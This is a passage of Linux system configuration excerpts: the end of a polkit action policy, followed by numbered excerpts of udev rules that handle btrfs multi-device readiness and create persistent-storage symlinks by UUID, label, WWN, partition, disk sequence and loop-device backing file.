    <defaults>
      <allow_any>auth_admin</allow_any>
      <allow_inactive>auth_admin</allow_inactive>
      <!-- NOTE: this is not a DoS because we are using /dev/loop-control -->
      <allow_active>yes</allow_active>
    </defaults>
  </action>

## btrfs udev rule and persistent-storage consumers
     1	# do not edit this file, it will be overwritten on update
     2	
     3	SUBSYSTEM!="block", GOTO="btrfs_end"
     4	ACTION=="remove", GOTO="btrfs_end"
     5	ENV{ID_FS_TYPE}!="btrfs", GOTO="btrfs_end"
     6	ENV{SYSTEMD_READY}=="0", GOTO="btrfs_end"
     7	
     8	# let the kernel know about this btrfs filesystem, and check if it is complete
     9	IMPORT{builtin}="btrfs ready $devnode"
    10	
    11	# mark the device as not ready to be used by the system
    12	ENV{ID_BTRFS_READY}=="0", ENV{SYSTEMD_READY}="0"
    13	
    14	# reconsider pending devices in case when multidevice volume awaits
    15	ENV{ID_BTRFS_READY}=="1", RUN+="/usr/bin/udevadm trigger -s block -p ID_BTRFS_READY=0"
    16	
    17	LABEL="btrfs_end"
   136	
   137	# by-label/by-uuid links (filesystem metadata)
   138	# Skip bcache backing devices, handled in 69-bcache.rules
   139	ENV{ID_FS_TYPE}=="bcache", GOTO="skip_bcache_fs_type"
   140	ENV{ID_FS_USAGE}=="filesystem|other|crypto", ENV{ID_FS_UUID_ENC}=="?*", SYMLINK+="disk/by-uuid/$env{ID_FS_UUID_ENC}"
   141	ENV{ID_FS_USAGE}=="filesystem|other|crypto", ENV{ID_FS_LABEL_ENC}=="?*", SYMLINK+="disk/by-label/$env{ID_FS_LABEL_ENC}"
   142	LABEL="skip_bcache_fs_type"
   143	
   144	# by-id (World Wide Name)
   145	ENV{ID_WWN_WITH_EXTENSION}=="?*", SYMLINK+="disk/by-id/wwn-$env{ID_WWN_WITH_EXTENSION}$env{.PART_SUFFIX}"
   146	
   147	# by-partlabel/by-partuuid links (partition metadata)
   148	ENV{ID_PART_ENTRY_UUID}=="?*", SYMLINK+="disk/by-partuuid/$env{ID_PART_ENTRY_UUID}"
   149	ENV{ID_PART_ENTRY_SCHEME}=="gpt", ENV{ID_PART_ENTRY_NAME}=="?*", SYMLINK+="disk/by-partlabel/$env{ID_PART_ENTRY_NAME}"
   150	
   151	# by-diskseq link (if an app is told to open a path like this, they may parse
   152	# the diskseq number from the path, then issue BLKGETDISKSEQ to verify they really got
   153	# the right device, to access specific disks in a race-free fashion)
   154	ENV{DISKSEQ}=="?*", ENV{ID_IGNORE_DISKSEQ}!="1", SYMLINK+="disk/by-diskseq/$env{DISKSEQ}$env{.PART_SUFFIX}"
   155	
   156	# Create symlinks that allow referencing loopback devices by their backing file's inode number
   157	ENV{ID_LOOP_BACKING_DEVICE}!="", ENV{ID_LOOP_BACKING_INODE}!="", SYMLINK+="disk/by-loop-inode/$env{ID_LOOP_BACKING_DEVICE}-$env{ID_LOOP_BACKING_INODE}$env{.PART_SUFFIX}"
   158	
   159	# Similar, but uses the .lo_file_name field of the loopback device (note that
   160	# this is basically just a free-form string passed from userspace to the kernel
   161	# when the device is created, it is not necessarily a file system path like the
   162	# "loop/backing_file" sysfs attribute, which is always an absolute path)
   163	ENV{ID_LOOP_BACKING_FILENAME_ENC}!="", SYMLINK+="disk/by-loop-ref/$env{ID_LOOP_BACKING_FILENAME_ENC}$env{.PART_SUFFIX}"
   164	
   165	LABEL="persistent_storage_end"

